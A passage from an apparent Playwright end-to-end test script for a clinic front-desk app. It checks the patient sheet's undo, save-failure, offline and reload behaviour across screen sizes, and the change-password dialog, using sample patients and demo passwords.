  assert.equal(await wrapTop(), top0, 'and the list stays put when the bar goes');
  // removed again, then the cursor in another row's Treatment Details: the Undo stays past its 10 seconds while the cursor
  // is in the list (nothing moves), and goes once the person has left the list
  await pb.mouse.move(5, 5);
  await r81.locator('.person').first().hover();
  await r81.locator('.person .chip-remove').first().click();
  await undoBar.waitFor();
  const details = pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${(await spareWaiting())[1]}")`) }).locator('input[aria-label^="Treatment details for"]');
  await details.click();
  await pb.keyboard.press('End');
  await pb.keyboard.type(' x');
  const y0 = await details.evaluate((el) => Math.round(el.getBoundingClientRect().top));
  await pb.waitForTimeout(10500);
  assert.ok(await undoBar.isVisible(), 'the Undo is still there while the cursor is in the list');
  assert.equal(await details.evaluate((el) => Math.round(el.getBoundingClientRect().top)), y0, 'the field with the cursor did not move');
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await undoBar.waitFor({ state: 'hidden', timeout: 10000 });
  assert.equal(await wrapTop(), top0, 'the list did not move when it went');
  // the checkup patients fail to load on one reload and load on the next: the warning comes and goes on the line of the counts
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__realDayCheckups ||= d.listDayCheckups;
    d.listDayCheckups = async () => { d.listDayCheckups = window.__realDayCheckups; throw new Error('The checkup list did not answer.'); };
    document.activeElement?.blur();
    document.dispatchEvent(new CustomEvent('sheet-reload'));
  });
  const warn = pb.locator('.sheet-bars .alert-warning', { hasText: 'Checkup patients could not be loaded' });
  await warn.waitFor({ timeout: 10000 });
  assert.deepEqual(await onLine(warn), onLineOk, 'the warning');
  assert.equal(await wrapTop(), top0);
  await pb.evaluate(() => document.dispatchEvent(new CustomEvent('sheet-reload')));
  await warn.waitFor({ state: 'hidden' });
  assert.equal(await wrapTop(), top0);
  // a typed change the server refuses: one line (what, Try again, Show); Show lists it with Discard, over the list
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__realUpdateVisit ||= d.updateVisit;
    d.updateVisit = async (id, changes) => { if ('details_text' in changes) throw new Error('Sample: the server refused this change'); return window.__realUpdateVisit.call(d, id, changes); };
  });
  const refused = pb.locator('table.sheet tbody tr', { has: pb.locator('.name-text:text-is("Sample Patient 060")') }).locator('input[aria-label^="Treatment details for"]');
  await refused.click();
  await pb.keyboard.press('End');
  await pb.keyboard.type(' x');
  const fails = pb.locator('#sheet-save-failures');
  await fails.waitFor({ timeout: 10000 });
  assert.deepEqual(await onLine(fails), onLineOk, 'the changes not saved');
  assert.equal(await wrapTop(), top0, 'the list did not move while the cursor is in it');
  await pb.locator('input[aria-label="Find on this list"]').focus();
  assert.match(await fails.locator('.sheet-fails-summary').innerText(), /^Not saved yet: Sample Patient 060, Treatment details ".+ x"\.$/);
  assert.ok(await fails.getByRole('button', { name: 'Try again', exact: true }).isVisible(), 'Try again on the line');
  assert.ok(await fails.locator('.sheet-fails-list').isHidden(), 'the list is closed');
  const show = fails.getByRole('button', { name: 'Show' });
  assert.equal(await show.getAttribute('aria-expanded'), 'false');
  await show.click();
  assert.equal(await fails.getByRole('button', { name: 'Hide' }).getAttribute('aria-expanded'), 'true');
  const open = await fails.locator('.sheet-fails-list').evaluate((el) => {
    const b = el.getBoundingClientRect();
    const line = document.querySelector('.sheet-subhead').getBoundingClientRect();
    const hit = document.elementFromPoint(b.left + b.width / 2, b.top + Math.min(b.height / 2, 12));
    return { underLine: b.top >= line.bottom - 0.5, onTop: el.contains(hit), inSight: b.left >= 0 && b.right <= window.innerWidth };
  });
  assert.deepEqual(open, { underLine: true, onTop: true, inSight: true }, 'opened over the list, under the line');
  assert.equal(await wrapTop(), top0, 'the list did not move');
  await pb.keyboard.press('Escape');
  assert.ok(await fails.locator('.sheet-fails-list').isHidden(), 'Escape closes it');
  assert.ok(await show.evaluate((el) => el === document.activeElement), 'and focus is back on Show');
  await show.click();
  await fails.getByRole('button', { name: /^Discard: Sample Patient 060/ }).click();
  await pb.locator('.modal').getByRole('button', { name: 'Discard', exact: true }).click();
  await fails.waitFor({ state: 'hidden' });
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.updateVisit = window.__realUpdateVisit; document.activeElement?.blur(); });
  await pb.waitForTimeout(300);
  assert.equal(await wrapTop(), top0, 'the list is where it was');
  await shot(pb, '24-sheet-bars-line');
});
// (a waiting row of the list with empty Treatment Details, that no step above needs as it is)
const emptyDetails = () => pb.evaluate(() => [...document.querySelectorAll('table.sheet tbody tr:not(.is-checkup)')]
  .filter((t) => t.querySelector('select[aria-label^="Status for"]').value === 'waiting' && !t.querySelector('input[aria-label^="Treatment details for"]').value)
  .map((t) => t.querySelector('.name-text').textContent)
  .filter((name) => { const n = Number(name.replace('Sample Patient ', '')); return n % 7 && n % 11 && n % 13 && ![87, 88, 89, 94, 95, 97, 100].includes(n); }));
const rowNamed = (name) => pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${name}")`) });
const detailsSaved = (name) => pb.evaluate(async (who) => {
  const { state } = await import('/js/state.js');
  const { localISO } = await import('/js/ui/dom.js');
  return (await state.data.listVisits({ branchId: 1, date: localISO() })).find((v) => v.patient.full_name === who)?.details_text ?? null;
}, name);
await step('busy day at 1366x768 and 1280x720: with the app\'s own long wording in the warning, every bar on the line of the counts starts inside its room and the Undo, Try again and Show buttons take the click; Tab out of the open list of changes not saved closes it; with no connection the list does not move and the line of the counts says so', async () => {
  await pb.mouse.move(5, 5);
  for (const [width, height] of [[1366, 768], [1280, 720]]) {
    await pb.setViewportSize({ width, height });
    await pb.evaluate(() => { document.activeElement?.blur(); document.querySelector('.sheet-wrap').scrollTop = 0; });
    const wrapTop = () => pb.locator('.sheet-wrap').evaluate((w) => Math.round(w.getBoundingClientRect().top));
    const top0 = await wrapTop();
    // (every bar on screen starts at or right of the slot's left edge, and every button of the bars is what a click there hits)
    const fits = () => pb.evaluate(() => {
      const slot = document.querySelector('.sheet-slot').getBoundingClientRect();
      const bars = [...document.querySelectorAll('.sheet-bars > .alert')].filter((b) => b.getClientRects().length);
      const buttons = [...document.querySelectorAll('.sheet-bars button')].filter((b) => b.getClientRects().length);
      return {
        outside: bars.filter((b) => b.getBoundingClientRect().left < slot.left - 0.5).map((b) => b.className),
        covered: buttons.filter((b) => { const r = b.getBoundingClientRect(); return document.elementFromPoint(r.left + r.width / 2, r.top + r.height / 2) !== b; }).map((b) => b.textContent),
        buttons: buttons.map((b) => b.textContent),
      };
    });
    await pb.evaluate(async () => {
      const { state } = await import('/js/state.js');
      const d = state.data;
      window.__realDayCheckups ||= d.listDayCheckups;
      d.listDayCheckups = async () => { throw Object.assign(new Error('Gateway Timeout'), { status: 504 }); };
      document.dispatchEvent(new CustomEvent('sheet-reload'));
    });
    const warn = pb.locator('.sheet-bars .alert-warning', { hasText: 'did not answer in time' });
    await warn.waitFor({ timeout: 10000 });
    assert.deepEqual(await fits(), { outside: [], covered: [], buttons: [] }, `${width}: the warning alone`);
    // the Undo of a doctor taken off a row (the first row in sight with a doctor)
    const name = await pb.evaluate(() => {
      const w = document.querySelector('.sheet-wrap').getBoundingClientRect();
      const tr = [...document.querySelectorAll('table.sheet tbody tr[data-id]')].find((t) => { const r = t.getBoundingClientRect(); return r.top > w.top + 30 && r.bottom < w.bottom - 10 && t.querySelector('.person .chip-remove') && t.querySelector('.name-text'); });
      return tr.querySelector('.name-text').textContent;
    });
    const row = rowNamed(name);
    await row.locator('.person').first().hover();
    await row.locator('.person .chip-remove').first().click();
    const undoBar = pb.locator('.sheet-bars .alert-info', { hasText: `removed from ${name}.` });
    await undoBar.waitFor();
    await pb.mouse.move(5, 5);
    assert.deepEqual(await fits(), { outside: [], covered: [], buttons: ['Undo'] }, `${width}: the warning and the Undo`);
    // a typed change the server refuses, in the same row
    await pb.evaluate(async () => {
      const { state } = await import('/js/state.js');
      const d = state.data;
      window.__realUpdateVisit ||= d.updateVisit;
      d.updateVisit = async (id, changes) => { if ('details_text' in changes) throw new Error('Sample: the server refused this change'); return window.__realUpdateVisit.call(d, id, changes); };
    });
    await row.locator('input[aria-label^="Treatment details for"]').click();
    await pb.keyboard.press('End');
    await pb.keyboard.type(' x');
    const fails = pb.locator('#sheet-save-failures');
    await fails.waitFor({ timeout: 10000 });
    await pb.locator('input[aria-label="Find on this list"]').focus();
    assert.deepEqual(await fits(), { outside: [], covered: [], buttons: ['Try again', 'Show', 'Undo'] }, `${width}: the warning, the Undo and the changes not saved`);
    assert.equal(await wrapTop(), top0, `${width}: the list did not move`);
    // the list of the changes not saved, opened with the keyboard, closes once Tab has left it (it would cover what Tab reaches)
    await fails.getByRole('button', { name: 'Show' }).focus();
    await pb.keyboard.press('Enter');
    assert.ok(await fails.locator('.sheet-fails-list').isVisible(), 'the list is open');
    for (let i = 0; i < 8 && await fails.evaluate((el) => el.contains(document.activeElement)); i++) await pb.keyboard.press('Tab');
    assert.ok(!(await fails.evaluate((el) => el.contains(document.activeElement))), 'Tab has left the list');
    assert.ok(await fails.locator('.sheet-fails-list').isHidden(), 'and it closed');
    await fails.getByRole('button', { name: 'Show' }).click();
    await fails.getByRole('button', { name: `Discard: ${name}, Treatment details` }).click();
    await pb.locator('.modal').getByRole('button', { name: 'Discard', exact: true }).click();
    await fails.waitFor({ state: 'hidden' });
    await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.updateVisit = window.__realUpdateVisit; });
    await undoBar.getByRole('button', { name: 'Undo' }).click();
    await undoBar.waitFor({ state: 'hidden' });
    // no connection: the banner of the staff pages would push the list down, so the line of the counts says it
    await pb.context().setOffline(true);
    const offline = pb.locator('.sheet-bars .sheet-offline');
    await offline.waitFor();
    assert.match(await offline.innerText(), /^No internet connection/);
    assert.ok(await pb.locator('.offline-banner').isHidden(), 'no banner above the top bar on this page');
    assert.equal(await wrapTop(), top0, `${width}: the list did not move when the connection dropped`);
    assert.deepEqual((await fits()).outside, [], `${width}: the bars with no connection`);
    await pb.context().setOffline(false);
    await offline.waitFor({ state: 'hidden' });
    assert.equal(await wrapTop(), top0, `${width}: nor when it came back`);
    await pb.evaluate(async () => {
      const { state } = await import('/js/state.js');
      state.data.listDayCheckups = window.__realDayCheckups;
      document.activeElement?.blur();
      document.dispatchEvent(new CustomEvent('sheet-reload'));
    });
    await warn.waitFor({ state: 'hidden' });
  }
  await pb.setViewportSize({ width: 1366, height: 768 });
});
await step('busy day: a status picked with the mouse and the cursor left on its chip: a note says the row waits, and once nothing has been pressed for 15 seconds it goes to its place, the cursor still on its chip and the list not scrolled', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => { document.activeElement?.blur(); document.querySelector('.sheet-wrap').scrollTop = 0; });
  await pb.waitForFunction(sortedLikeTheSheet, null, { timeout: 15000 });
  const name = (await spareWaiting())[3];
  const at = () => pb.evaluate((who) => [...document.querySelectorAll('table.sheet tbody tr[data-id]')].findIndex((t) => t.querySelector('.name-text')?.textContent === who), name);
  const before = await at();
  const status = rowNamed(name).locator('select[aria-label^="Status for"]');
  await status.click();
  await status.selectOption('in_treatment');
  const picked = Date.now();
  await pb.mouse.move(5, 5);
  const note = pb.locator('.sheet-new-rows');
  await pb.waitForFunction(() => document.querySelector('.sheet-new-rows').textContent === '1 row with a new status goes to its place when you leave the list');
  const scrolled = await pb.evaluate(() => document.querySelector('.sheet-wrap').scrollTop);
  await pb.waitForTimeout(8000);
  assert.equal(await at(), before, 'still in its place 8 seconds after');
  await pb.waitForFunction(([b]) => {
    const i = [...document.querySelectorAll('table.sheet tbody tr[data-id]')].findIndex((t) => t.contains(document.activeElement));
    return i > b;
  }, [before], { timeout: 12000 });
  assert.ok(Date.now() - picked >= 14000, 'not before the 15 seconds: ' + (Date.now() - picked));
  assert.ok(await status.evaluate((el) => el === document.activeElement), 'the cursor is on its chip, in its new place');
  assert.equal(await status.inputValue(), 'in_treatment');
  assert.ok(await pb.evaluate(sortedLikeTheSheet), 'sorted like the sheet');
  assert.equal(await note.innerText(), '', 'the note has gone');
  assert.equal(await pb.evaluate(() => document.querySelector('.sheet-wrap').scrollTop), scrolled, 'the list did not scroll');
  await pb.evaluate(() => document.activeElement?.blur());
});
await step('busy day: quick-tap: a tap, the list reloaded while the dialog is open (the row is drawn again behind it), more taps and Done: the cell has every tap, and typing in it carries on from them', async () => {
  await pb.evaluate(() => document.activeElement?.blur());
  const name = (await emptyDetails())[0];
  const row = rowNamed(name);
  const details = row.locator('input[aria-label^="Treatment details for"]');
  await row.locator('.quick-tap').click();
  await pb.locator('.modal button:text-is("U L")').click();
  for (let i = 0; i < 30 && (await detailsSaved(name)) !== 'U L'; i++) await pb.waitForTimeout(200);
  await pb.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  // another computer writes a note on the same visit and the list is told (or the 20-second check finds it): the row is
  // drawn again behind the dialog
  await row.evaluate((tr) => { tr.dataset.before = 'yes'; });
  await pb.evaluate(async (who) => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const v = (await state.data.listVisits({ branchId: 1, date: localISO() })).find((x) => x.patient.full_name === who);
    await state.data.updateVisit(v.id, { notes: 'Sample: called ahead' });
    document.dispatchEvent(new CustomEvent('sheet-reload'));
  }, name);
  await pb.waitForFunction((who) => { const tr = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.querySelector('.name-text')?.textContent === who); return tr && !tr.dataset.before; }, name, { timeout: 25000 });
  await pb.locator('.modal button:text-is("018")').click();
  await pb.locator('.modal button:text-is("PC")').click();
  await pb.locator('.modal').getByRole('button', { name: 'Done' }).click();
  await pb.waitForSelector('.modal', { state: 'detached' });
  assert.equal(await details.inputValue(), 'U L 018 PC', 'the cell has every tap');
  await details.click();
  await pb.keyboard.press('End');
  await pb.keyboard.type(' refresh');
  for (let i = 0; i < 30 && (await detailsSaved(name)) !== 'U L 018 PC refresh'; i++) await pb.waitForTimeout(200);
  assert.equal(await detailsSaved(name), 'U L 018 PC refresh', 'saved with every tap and the typing after them');
  await pb.evaluate(() => document.activeElement?.blur());
});
await step('busy day, slow server, no live update: a reload that read the list before a typed change reached the database, and answers after it was saved, does not put the old text back when the list is drawn', async () => {
  // (a page of its own: the queue of typed changes starts empty, so the save goes out at its usual time)
  const ps = await newPage({ width: 1366, height: 768 });
  await loginAs(ps, 'Front desk \\(Gulshan\\)');
  await ps.goto(BASE + '#/staff/sheet?demo=busy');
  await ps.waitForFunction(() => document.querySelectorAll('table.sheet tbody tr').length >= 120);
  await ps.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    const real = { listVisits: d.listVisits, updateVisit: d.updateVisit };
    const wait = (ms) => new Promise((r) => setTimeout(r, ms));
    window.__t = { reads: [], saved: [] };
    // (a save is in the database 100 ms after it is sent and answers 100 ms later; the list is read at once and answers 900 ms later)
    d.updateVisit = async (...a) => { await wait(100); const out = await real.updateVisit.apply(d, a); window.__t.saved.push(Date.now()); await wait(100); return out; };
    d.listVisits = async (args) => { const list = await real.listVisits.call(d, args); if (!args.patientId) { const at = Date.now(); await wait(900); window.__t.reads.push([at, Date.now()]); } return list; };
    document.activeElement?.blur();
  });
  const name = await ps.evaluate(() => [...document.querySelectorAll('table.sheet tbody tr:not(.is-checkup)')]
    .find((t) => t.querySelector('select[aria-label^="Status for"]').value === 'waiting' && !t.querySelector('input[aria-label^="Treatment details for"]').value).querySelector('.name-text').textContent);
  const details = ps.locator('table.sheet tbody tr', { has: ps.locator(`.name-text:text-is("${name}")`) }).locator('input[aria-label^="Treatment details for"]');
  await details.click();
  await ps.keyboard.type('U L 016 PC', { delay: 40 });
  await ps.waitForTimeout(80);
  await ps.evaluate(() => document.dispatchEvent(new CustomEvent('sheet-reload'))); // (the 20-second check)
  await ps.waitForTimeout(2000);
  const t = await ps.evaluate(() => window.__t);
  assert.ok(t.reads.length && t.saved.length && t.reads[0][0] < t.saved[0] && t.reads[0][1] > t.saved[0] + 100, 'the reload read the list before the save and answered after it: ' + JSON.stringify(t));
  assert.equal(await ps.locator('.save-status').innerText(), 'All changes saved');
  await ps.locator('h1').click(); // (the person leaves the list: it is drawn once the 5 seconds after the last key are over)
  await ps.waitForTimeout(6500);
  assert.equal(await details.inputValue(), 'U L 016 PC', 'the cell keeps what was typed');
  await details.click();
  await ps.keyboard.press('End');
  await ps.keyboard.type(' refresh');
  const saved = () => ps.evaluate(async (who) => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await state.data.listVisits({ branchId: 1, date: localISO() })).find((v) => v.patient.full_name === who)?.details_text;
  }, name);
  for (let i = 0; i < 30 && (await saved()) !== 'U L 016 PC refresh'; i++) await ps.waitForTimeout(200);
  assert.equal(await saved(), 'U L 016 PC refresh', 'saved with the typing after it, the earlier text kept');
  await ps.close();
});
await step('busy day: a quiet reload with nothing new draws nothing; after a click on a Token cell, a change from another computer draws the list again, and Tab goes on in that row (no jump to the first row, no scrolling); scrolling with the mouse wheel holds the list like a key or a click', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => { document.activeElement?.blur(); document.querySelector('.sheet-wrap').scrollTop = 1000; });
  await pb.waitForTimeout(5500); // (the 5 seconds after the last key or click in the list)
  const mark = () => pb.evaluate(() => { for (const tr of document.querySelectorAll('table.sheet tbody tr')) tr.dataset.mark = 'yes'; });
  const marked = () => pb.evaluate(() => document.querySelectorAll('table.sheet tbody tr[data-mark]').length);
  await pb.evaluate(() => document.dispatchEvent(new CustomEvent('sheet-reload'))); // (what the steps above changed is drawn)
  await pb.waitForTimeout(1000);
  await mark();
  await pb.evaluate(() => document.dispatchEvent(new CustomEvent('sheet-reload')));
  await pb.waitForTimeout(1000);
  assert.ok((await marked()) >= 120, 'the rows on screen are the ones drawn before: ' + (await marked()));
  // a click on the Token cell of a row in the middle of the screen, then another computer marks a waiting patient No show
  const name = await pb.evaluate(() => {
    const w = document.querySelector('.sheet-wrap').getBoundingClientRect();
    const trs = [...document.querySelectorAll('table.sheet tbody tr[data-id]:not(.is-checkup)')].filter((t) => { const r = t.getBoundingClientRect(); return r.top > w.top + 200 && r.bottom < w.bottom - 100; });
    return trs[0].querySelector('.name-text').textContent;
  });
  await rowNamed(name).locator('td:has(> .token)').click();
  const scrolled = await pb.evaluate(() => document.querySelector('.sheet-wrap').scrollTop);
  await elsewhere({ [(await spareWaiting())[0]]: 'no_show' });
  await pb.waitForFunction(() => !document.querySelector('table.sheet tbody tr[data-mark]'), null, { timeout: 12000 }); // (drawn again)
  await pb.keyboard.press('Tab');
  assert.deepEqual(await pb.evaluate(() => [document.activeElement?.closest('tr')?.querySelector('.name-text')?.textContent, document.activeElement?.dataset.focus]), [name, 'status'], 'Tab goes to the Status of that row');
  assert.equal(await pb.evaluate(() => document.querySelector('.sheet-wrap').scrollTop), scrolled, 'the list did not scroll');
  await pb.evaluate(() => document.activeElement?.blur());
  // the wheel: a click in the list, a change from another computer, then the list scrolled with the wheel for 7 seconds:
  // nothing is drawn while the wheel turns, and the list is drawn once it has stopped for 5 seconds
  await pb.waitForTimeout(5500);
  const box = await pb.locator('.sheet-wrap').boundingBox();
  await pb.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
  await rowNamed(name).locator('td:has(> .token)').click();
  await mark();
  await elsewhere({ [(await spareWaiting())[0]]: 'no_show' });
  const started = Date.now();
  for (let i = 0; Date.now() - started < 7000; i++) { await pb.mouse.wheel(0, i % 2 ? -50 : 50); await pb.waitForTimeout(250); }
  assert.ok((await marked()) >= 100, 'not drawn while the wheel turns: ' + (await marked()));
  const stopped = Date.now();
  await pb.waitForFunction(() => document.querySelectorAll('table.sheet tbody tr[data-mark]').length < 10, null, { timeout: 10000 });
  assert.ok(Date.now() - stopped >= 3500, 'drawn once the wheel had stopped for a while: ' + (Date.now() - stopped));
  assert.ok(await pb.evaluate(sortedLikeTheSheet), 'sorted like the sheet');
  await pb.mouse.move(5, 5);
});
await step('busy day on a phone (390px, touch, 44px rows): every chip\'s × is in sight and takes the tap, and a name cut short is whole in the tooltip', async () => {
  const pt = await newPage({ width: 390, height: 844 }, { isMobile: true, hasTouch: true });
  await loginAs(pt, 'Front desk \\(Gulshan\\)');
  await pt.goto(BASE + '#/staff/sheet?demo=busy');
  await pt.waitForFunction(() => document.querySelectorAll('table.sheet tbody tr').length >= 120);
  const c = await pt.evaluate(checkChips);
  assert.ok(c.n >= 140, 'chips: ' + JSON.stringify(c));
  assert.deepEqual(c.blocked, [], 'a × that cannot be tapped');
  assert.deepEqual(c.unreadable, [], 'a name that cannot be read');
  // The list's fields are 16px here (iOS zooms into a smaller field on every tap), and the Status and Group chips are wide
  // enough for their words in that size.
  const fields = await pt.evaluate(() => {
    const canvas = document.createElement('canvas').getContext('2d');
    const out = { sizes: {}, cut: [] };
    const sel = { treatment: 'input[aria-label^="Treatment for"]', details: 'input[aria-label^="Treatment details for"]', name: 'input[aria-label^="Name of checkup patient"]',
      token: 'input[aria-label^="Token of checkup patient"]', phone: 'input[aria-label^="Phone for"]', status: 'select[aria-label^="Status for"]', group: 'select[aria-label^="Doctor group for"]' };
    for (const [k, s] of Object.entries(sel)) {
      const els = [...document.querySelectorAll(`table.sheet tbody ${s}`)];
      out.sizes[k] = els.length ? Math.min(...els.map((el) => parseFloat(getComputedStyle(el).fontSize))) : 0;
      for (const el of els.filter((x) => x.tagName === 'SELECT')) {
        const cs = getComputedStyle(el);
        canvas.font = `${cs.fontWeight} ${cs.fontSize} ${cs.fontFamily}`;
        const words = el.options[el.selectedIndex].text;
        if (canvas.measureText(words).width > el.clientWidth - parseFloat(cs.paddingLeft) - parseFloat(cs.paddingRight) + 0.5) out.cut.push(words);
      }
    }
    out.cut = [...new Set(out.cut)];
    return out;
  });
  for (const [k, px] of Object.entries(fields.sizes)) assert.ok(px >= 16, `${k} cells: ${px}px`);
  assert.deepEqual(fields.cut, [], 'chip words cut short');
  // the Filters panel opens on the screen, and the page does not scroll sideways
  await pt.getByRole('button', { name: 'Filters', exact: true }).click();
  const f = await pt.evaluate(() => { const r = document.querySelector('#sheet-filter-panel').getBoundingClientRect(); return { left: Math.round(r.left), right: Math.round(r.right), sideScroll: document.documentElement.scrollWidth > window.innerWidth + 1 }; });
  assert.ok(f.left >= 0 && f.right <= 390 && !f.sideScroll, 'the Filters panel is on the screen: ' + JSON.stringify(f));
  await pt.close();
});
await pb.close(); // (the busy list is not used again)

// ------------------------------------------------------------- change password (account menu and phone drawer)
// The demo has no real passwords: the first current password is accepted whatever it is, the one chosen is remembered for the page.
const pw = await newPage();
const changeDialog = (pg) => pg.locator('.modal');
const changeField = (pg, label) => changeDialog(pg).locator(`.field:has(label:text-is("${label}"))`);
const changeFill = async (pg, current, next, again) => {
  await changeDialog(pg).getByLabel('Current password', { exact: true }).fill(current);
  await changeDialog(pg).getByLabel('New password', { exact: true }).fill(next);
  await changeDialog(pg).getByLabel('Type the new password again', { exact: true }).fill(again);
};
const changeSubmit = (pg) => changeDialog(pg).getByRole('button', { name: 'Change password', exact: true }).click();
const changeOpen = async (pg, { wait = true } = {}) => {
  await pg.locator('.user-menu > button').click();
  await pg.locator('.user-menu .menu-list button:has-text("Change password")').click();
  if (wait) await pg.waitForSelector('.modal h2:has-text("Change password")');
};
await step('staff: "Change password" is in the account menu above "Log out" and opens the dialog with its three fields', async () => {
  await loginAs(pw, 'Front desk \\(Gulshan\\)');
  await pw.locator('.user-menu > button').click();
  const items = (await pw.locator('.user-menu .menu-list button').allTextContents()).map((t) => t.trim());
  assert.deepEqual(items, ['Arrange my menu', 'Change password', 'Log out']);
  await pw.locator('.user-menu .menu-list button:has-text("Change password")').click();
  await pw.waitForSelector('.modal h2:has-text("Change password")');
  assert.equal(await pw.locator('.user-menu.open').count(), 0, 'the menu closed behind the dialog');
  assert.equal(await changeDialog(pw).getByLabel('Current password', { exact: true }).getAttribute('autocomplete'), 'current-password');
  assert.equal(await changeDialog(pw).getByLabel('New password', { exact: true }).getAttribute('autocomplete'), 'new-password');
  assert.equal(await changeDialog(pw).getByLabel('Type the new password again', { exact: true }).getAttribute('autocomplete'), 'new-password');
  assert.match(await changeField(pw, 'New password').innerText(), /At least 8 characters/);
  assert.equal(await changeDialog(pw).locator('input[type=password]').count(), 3);
  await changeDialog(pw).getByLabel('Show the new password').check();
  assert.equal(await changeDialog(pw).locator('input[type=password]').count(), 1, 'the box shows the two new passwords as typed');
  assert.equal(await changeDialog(pw).getByLabel('Current password', { exact: true }).getAttribute('type'), 'password',
    'the current password stays hidden (a browser may have filled in a saved one)');
  await changeDialog(pw).getByLabel('Show the new password').uncheck();
  assert.equal(await changeDialog(pw).locator('input[type=password]').count(), 3);
  await shot(pw, '14-change-password');
  await pw.keyboard.press('Escape');
  await pw.waitForSelector('.modal', { state: 'detached' });
  assert.ok(await pw.evaluate(() => document.activeElement?.closest('.user-menu') !== null), 'focus is back on the account button');
});
await step('empty, short and mismatching entries are refused next to the field, nothing is sent', async () => {
  await changeOpen(pw);
  await changeSubmit(pw);
  for (const label of ['Current password', 'New password', 'Type the new password again']) assert.ok(await changeField(pw, label).locator('.field-error').count(), `${label} says what is missing`);
  await changeFill(pw, 'old-pass-1', 'short', 'short');
  await changeSubmit(pw);
  assert.match(await changeField(pw, 'New password').locator('.field-error').innerText(), /at least 8 characters/);
  await changeFill(pw, 'old-pass-1', 'brand-new-pass-1', 'brand-new-pass-2');
  await changeSubmit(pw);
  assert.match(await changeField(pw, 'Type the new password again').locator('.field-error').innerText(), /not the same/);
  assert.equal(await changeField(pw, 'New password').locator('.field-error').count(), 0, 'the error is next to the field that is wrong');
  assert.equal(await pw.locator('.toast:has-text("Password changed")').count(), 0);
  assert.ok(await changeDialog(pw).count(), 'the dialog is still open');
});
await step('success: the dialog closes, the toast says what to do next time, and the person stays logged in', async () => {
  await changeFill(pw, 'old-pass-1', 'brand-new-pass-1', 'brand-new-pass-1');
  await changeSubmit(pw);
  await pw.waitForSelector('.toast:has-text("Password changed. Use the new password next time you log in.")');
  await pw.waitForSelector('.modal', { state: 'detached' });
  assert.ok(await pw.locator('.topbar').isVisible());
  assert.match(pw.url(), /#\/staff\//);
  await shot(pw, '15-password-changed');
});
await step('a wrong current password says "not right" next to that field; the same new password is refused; the right current one works', async () => {
  await changeOpen(pw);
  await changeFill(pw, 'wrong-old-9', 'second-pass-22', 'second-pass-22');
  await changeSubmit(pw);
  assert.match(await changeField(pw, 'Current password').locator('.field-error').innerText(), /not right/);
  assert.ok(await changeDialog(pw).count(), 'still open, nothing changed');
  await changeFill(pw, 'brand-new-pass-1', 'brand-new-pass-1', 'brand-new-pass-1');
  await changeSubmit(pw);
  assert.match(await changeField(pw, 'New password').locator('.field-error').innerText(), /different/);
  await changeFill(pw, 'brand-new-pass-1', 'second-pass-22', 'second-pass-22');
  await changeDialog(pw).getByLabel('Type the new password again', { exact: true }).press('Enter'); // Enter sends it, like the button
  await pw.waitForSelector('.modal', { state: 'detached' });
  assert.ok(await pw.locator('.toast:has-text("Password changed")').count());
  assert.ok(await pw.locator('.topbar').isVisible(), 'still logged in');
});
const pwPhone = await newPage({ width: 390, height: 844 });
await step('at phone width the drawer shows "Change password" next to "Log out", and the dialog opens from it', async () => {
  await loginAs(pwPhone, 'Front desk \\(Gulshan\\)');
  await pwPhone.locator('.menu-toggle').click();
  await pwPhone.waitForSelector('#staff-drawer.open');
  const items = (await pwPhone.locator('.sidebar-foot button').allTextContents()).map((t) => t.trim());
  assert.deepEqual(items, ['Change password', 'Log out']);
  await shot(pwPhone, '16-drawer-change-password');
  await pwPhone.locator('.sidebar-foot button:has-text("Change password")').click();
  await pwPhone.waitForSelector('.modal h2:has-text("Change password")');
  assert.equal(await pwPhone.locator('#staff-drawer.open').count(), 0, 'the drawer closed behind the dialog');
  const box = await changeDialog(pwPhone).boundingBox();
  assert.ok(box.x >= 0 && box.x + box.width <= 390, 'the dialog fits the screen');
  await changeFill(pwPhone, 'old-pass-1', 'phone-pass-11', 'phone-pass-11');
  await changeSubmit(pwPhone);
  await pwPhone.waitForSelector('.toast:has-text("Password changed")');
  await pwPhone.waitForSelector('.modal', { state: 'detached' });
  assert.ok(await pwPhone.evaluate(() => document.activeElement?.classList.contains('menu-toggle')), 'focus is back on the menu button');
});

// ------------------------------------------------------------- change password: loading, closing, password managers, the phone drawer
const pwLate = await newPage();
const dialogRequests = [];
pwLate.on('request', (r) => { if (/\/js\/ui\/password-dialog\.js/.test(r.url())) dialogRequests.push(r.url()); });
await pwLate.route('**/js/ui/password-dialog.js', async (route) => { await new Promise((r) => setTimeout(r, 1500)); await route.continue(); }); // a slow connection
await step('the dialog code is fetched when the account menu opens, and two clicks while it loads make ONE dialog', async () => {
  await loginAs(pwLate, 'Front desk \\(Gulshan\\)');
  assert.equal(dialogRequests.length, 0, 'not fetched before the menu is used');
  await pwLate.locator('.user-menu > button').click();
  for (let i = 0; i < 20 && !dialogRequests.length; i++) await pwLate.waitForTimeout(50);
  assert.equal(dialogRequests.length, 1, 'fetched as the menu opened, before any click on the item');
  await pwLate.locator('.user-menu .menu-list button:has-text("Change password")').click();
  await pwLate.waitForTimeout(200);
  assert.equal(await pwLate.locator('.modal').count(), 0, 'still loading');
  await changeOpen(pwLate, { wait: false }); // the impatient second click
  await pwLate.waitForSelector('.modal h2:has-text("Change password")');
  await pwLate.waitForTimeout(500);
  assert.equal(await pwLate.locator('.modal').count(), 1, 'one dialog, not two stacked ones');
});
await step('the dialog gives password managers the login name, starts on the current password, and warns about other devices', async () => {
  const dialog = changeDialog(pwLate);
  const login = dialog.locator('input[autocomplete="username"]');
  assert.equal(await login.count(), 1);
  assert.equal(await login.inputValue(), 'demo.frontdesk2@example.com');
